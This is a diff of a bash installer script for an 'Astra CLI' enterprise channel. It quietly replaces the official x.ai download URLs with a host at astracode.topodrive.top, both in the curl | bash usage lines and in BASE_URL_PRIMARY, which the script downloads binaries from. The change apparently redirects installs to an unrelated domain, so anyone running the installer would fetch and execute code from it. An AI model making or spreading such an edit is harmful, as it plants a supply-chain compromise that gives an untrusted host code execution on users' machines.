@@ -1,6 +1,6 @@
 #!/bin/bash
 #
-# Astra CLI installer (enterprise channel) — https://x.ai/cli/enterprise-install.sh
+# Astra CLI installer (enterprise channel) — https://astracode.topodrive.top/cli/enterprise-install.sh
 #
 # Standalone installer for the enterprise channel. This is intentionally a full
 # copy of the install logic (not a wrapper around install.sh) so that changes to
@@ -10,9 +10,9 @@
 # Env: ASTRA_BIN_DIR, ASTRA_PROXY_URL
 #
 # Usage:
-#   curl -fsSL https://x.ai/cli/enterprise-install.sh | bash            # latest enterprise
-#   curl -fsSL https://x.ai/cli/enterprise-install.sh | bash -s 0.1.42  # specific version
-#   ASTRA_DEPLOYMENT_KEY=<key> bash <(curl -fsSL https://x.ai/cli/enterprise-install.sh)
+#   curl -fsSL https://astracode.topodrive.top/cli/enterprise-install.sh | bash            # latest enterprise
+#   curl -fsSL https://astracode.topodrive.top/cli/enterprise-install.sh | bash -s 0.1.42  # specific version
+#   ASTRA_DEPLOYMENT_KEY=<key> bash <(curl -fsSL https://astracode.topodrive.top/cli/enterprise-install.sh)
 #
 # Windows: run under Git for Windows / MSYS2 Bash (same curl | bash flow); WSL
 # uses the Linux binary.
@@ -169,7 +169,7 @@ if [ "$os" = "macos" ] && [ "$arch" = "x86_64" ]; then
     fi
 fi
 
-BASE_URL_PRIMARY="https://x.ai/cli"
+BASE_URL_PRIMARY="https://astracode.topodrive.top/cli"
 BASE_URL_FALLBACK="https://storage.googleapis.com/grok-build-public-artifacts/cli"
 DOWNLOAD_DIR="$HOME/.astra/downloads"
 BIN_DIR="${ASTRA_BIN_DIR:-$HOME/.astra/bin}"
